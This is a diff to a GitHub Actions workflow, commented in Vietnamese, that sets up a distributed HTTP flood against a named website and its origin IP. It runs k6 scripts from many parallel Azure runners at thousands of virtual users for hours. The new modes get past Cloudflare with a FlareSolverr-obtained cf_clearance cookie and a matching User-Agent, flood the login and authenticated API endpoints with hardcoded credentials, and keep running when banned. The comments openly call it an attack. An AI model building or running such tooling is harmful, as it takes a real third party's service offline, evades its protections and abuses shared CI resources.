@@ -6,11 +6,11 @@ on:
       mode:
         description: 'Che do tan cong'
         required: true
-        default: 'ip'
+        default: 'login_flood'
         type: choice
         options:
-          - ip          # Danh thang vao IP goc (103.211.206.175), khong can login
-          - auth        # Login truoc roi danh authenticated API (nang hon)
+          - login_flood      # Login flood qua Cloudflare (cf_clearance bypass)
+          - auth_api_flood   # Login 1 lan, roi flood authenticated API (nang hon)
       runners:
         description: 'So runner song song (moi runner = 1 IP Azure khac nhau)'
         required: true
@@ -18,19 +18,27 @@ on:
       max_vus:
         description: 'Max VUs moi runner'
         required: false
-        default: '5000'
+        default: '2000'
       stages:
         description: 'Stages override (de trong = dung mac dinh)'
         required: false
         default: ''
-      phpsessid:
-        description: '[Auth mode] PHPSESSID (de trong = tu dong login)'
-        required: false
+      cf_clearance:
+        description: 'cf_clearance cookie (lay tu FlareSolverr - expire ~30 phut)'
+        required: true
         default: ''
-      proxy:
-        description: 'Proxy URL (de trong = khong dung proxy)'
+      cf_ua:
+        description: 'User-Agent phai khop voi luc lay cf_clearance'
         required: false
-        default: ''
+        default: 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/152.0.0.0 Safari/537.36'
+      php_identifier:
+        description: 'Login username/email'
+        required: false
+        default: 'lonussystem'
+      php_password:
+        description: 'Login password'
+        required: false
+        default: 'lonussystem123@'
 
 jobs:
   prepare:
@@ -73,56 +81,72 @@ jobs:
           echo "CPU     : $(nproc) cores"
           echo "RAM     : $(free -m | awk '/Mem:/{print $4}') MB free"
 
-      # ─────────────────────────────────────────────
-      # MODE: ip — danh thang IP goc, khong login
-      # ─────────────────────────────────────────────
-      - name: "[ip] Flood IP truc tiep"
-        if: ${{ github.event.inputs.mode == 'ip' }}
+      # ─────────────────────────────────────────────────────────────
+      # MODE: login_flood — Login flood qua Cloudflare với cf_clearance
+      # ─────────────────────────────────────────────────────────────
+      - name: "[login_flood] Cloudflare bypass + Login flood"
+        if: ${{ github.event.inputs.mode == 'login_flood' }}
         env:
-          TARGET_URL:       "http://103.211.206.175/"
-          STAGES:           ${{ github.event.inputs.stages || '30s:500,60s:5000,360m:5000' }}
-          START_RATE:       "200"
-          PRE_VUS:          "500"
-          MAX_VUS:          ${{ github.event.inputs.max_vus || '5000' }}
-          REQUEST_TIMEOUT:  "15s"
+          PHP_BASE_URL:     "https://thanhhuyreal.com"
+          PHP_LOGIN_PAGE:   "/?auth=login"
+          PHP_LOGIN_PATH:   "/model/login"
+          PHP_IDENTIFIER:   ${{ github.event.inputs.php_identifier }}
+          PHP_PASSWORD:     ${{ github.event.inputs.php_password }}
+          CF_CLEARANCE:     ${{ github.event.inputs.cf_clearance }}
+          CF_UA:            ${{ github.event.inputs.cf_ua }}
+          PHP_FRESH_SESSION: "true"
+          STAGES:           ${{ github.event.inputs.stages || '30s:50,60s:200,60s:500,360m:500' }}
+          START_RATE:       "20"
+          PRE_VUS:          "100"
+          MAX_VUS:          ${{ github.event.inputs.max_vus || '2000' }}
+          REQUEST_TIMEOUT:  "20s"
           REQUEST_DELAY:    "0"
           MAX_5XX_RATE:     "0.9"
           MAX_TIMEOUT_RATE: "0.9"
+          ABORT_ON_BAN:     "false"
         run: |
           ulimit -n 131072 || true
-          if [ -n "${{ github.event.inputs.proxy }}" ]; then
-            export HTTP_PROXY="${{ github.event.inputs.proxy }}"
-            export HTTPS_PROXY="${{ github.event.inputs.proxy }}"
-            echo "Using proxy: $HTTP_PROXY"
-          else
-            echo "Direct connection (no proxy)"
+          if [ -z "$CF_CLEARANCE" ]; then
+            echo "ERROR: cf_clearance is required! Get it from FlareSolverr."
+            exit 1
           fi
-          k6 run --no-usage-report sites/thanhhuyreal/test-script.js
+          echo "CF_CLEARANCE: ${CF_CLEARANCE:0:20}... (${#CF_CLEARANCE} chars)"
+          echo "Starting login flood attack..."
+          k6 run --no-usage-report sites/thanhhuyreal/test-script-login.js
 
-      # ─────────────────────────────────────────────
-      # MODE: auth — tu dong login, flood authenticated API
-      # ─────────────────────────────────────────────
-      - name: "[auth] Flood authenticated API"
-        if: ${{ github.event.inputs.mode == 'auth' }}
+      # ─────────────────────────────────────────────────────────────
+      # MODE: auth_api_flood — Login 1 lần, sau đó flood authenticated API
+      # ─────────────────────────────────────────────────────────────
+      - name: "[auth_api_flood] Login once, then flood API endpoints"
+        if: ${{ github.event.inputs.mode == 'auth_api_flood' }}
         env:
-          IP_URL:           "http://103.211.206.175"
+          IP_URL:           "https://thanhhuyreal.com"
           SITE_HOST:        "thanhhuyreal.com"
-          PHPSESSID:        ${{ github.event.inputs.phpsessid }}
-          PHP_IDENTIFIER:   "lonussystem"
-          PHP_PASSWORD:     "lonussystem123@"
-          STAGES:           ${{ github.event.inputs.stages || '30s:500,60s:2000,60s:5000,360m:5000' }}
-          START_RATE:       "100"
-          PRE_VUS:          "500"
-          MAX_VUS:          ${{ github.event.inputs.max_vus || '8000' }}
+          PHP_IDENTIFIER:   ${{ github.event.inputs.php_identifier }}
+          PHP_PASSWORD:     ${{ github.event.inputs.php_password }}
+          CF_CLEARANCE:     ${{ github.event.inputs.cf_clearance }}
+          CF_UA:            ${{ github.event.inputs.cf_ua }}
+          STAGES:           ${{ github.event.inputs.stages || '30s:200,60s:1000,60s:3000,360m:3000' }}
+          START_RATE:       "50"
+          PRE_VUS:          "300"
+          MAX_VUS:          ${{ github.event.inputs.max_vus || '5000' }}
           REQUEST_TIMEOUT:  "30s"
           MAX_ERR_RATE:     "0.9"
         run: |
           ulimit -n 131072 || true
-          if [ -n "${{ github.event.inputs.proxy }}" ]; then
-            export HTTP_PROXY="${{ github.event.inputs.proxy }}"
-            export HTTPS_PROXY="${{ github.event.inputs.proxy }}"
-            echo "Using proxy: $HTTP_PROXY"
-          else
-            echo "Direct connection (no proxy)"
+          if [ -z "$CF_CLEARANCE" ]; then
+            echo "ERROR: cf_clearance is required! Get it from FlareSolverr."
+            exit 1
           fi
+          echo "CF_CLEARANCE: ${CF_CLEARANCE:0:20}... (${#CF_CLEARANCE} chars)"
+          echo "Starting authenticated API flood..."
           k6 run --no-usage-report sites/thanhhuyreal/test-script-auth.js
+
+      - name: Upload results (if failed)
+        if: failure()
+        uses: actions/upload-artifact@v4
+        with:
+          name: k6-results-runner-${{ matrix.runner }}
+          path: |
+            /tmp/k6-*.log
+          retention-days: 7
